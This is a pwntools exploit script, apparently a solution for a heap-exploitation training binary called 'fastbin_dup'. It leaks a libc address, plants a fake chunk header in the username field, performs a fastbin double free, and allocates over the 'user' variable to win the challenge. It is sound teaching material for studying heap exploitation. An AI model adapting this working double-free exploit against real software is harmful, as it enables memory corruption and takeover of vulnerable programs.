from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./fastbin_dup', checksec=False)
libc = elf.libc

environ = {"LD_PRELOAD": libc.path}

gs = """

"""
index = 0

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, env=environ, gdbscript=gs)
    else:
        return process(elf.path)
    
def send_name(name):
    sa(b'Enter your username: ', name)
    
def malloc(size, data):
    global index
    s(b'1')
    sa(b'size: ', f'{size}'.encode())
    sa(b'data: ', data)
    rcu(b'> ')
    index += 1
    return index -1

def free(index):
    s(b'2')
    sa(b'index: ', f'{index}'.encode())
    rcu(b'> ')
        
    
io = start()

io.recvuntil(b'puts() @ ')
puts_leak = int(io.recvline(), 16)
success("puts: " + hex(puts_leak))

send_name(p64(0) + p64(0x31))
chunk_A = malloc(0x28, b'a'*0x28)
chunk_B = malloc(0x28, b'b'*0x28)

free(chunk_A)
free(chunk_B)
free(chunk_A)

dup = malloc(0x28, p64(elf.sym['user']))

malloc(0x28, b'c'*0x28)
malloc(0x28, b'd'*0x28)
malloc(0x28, b'You win')

s(b'3')
io.interactive()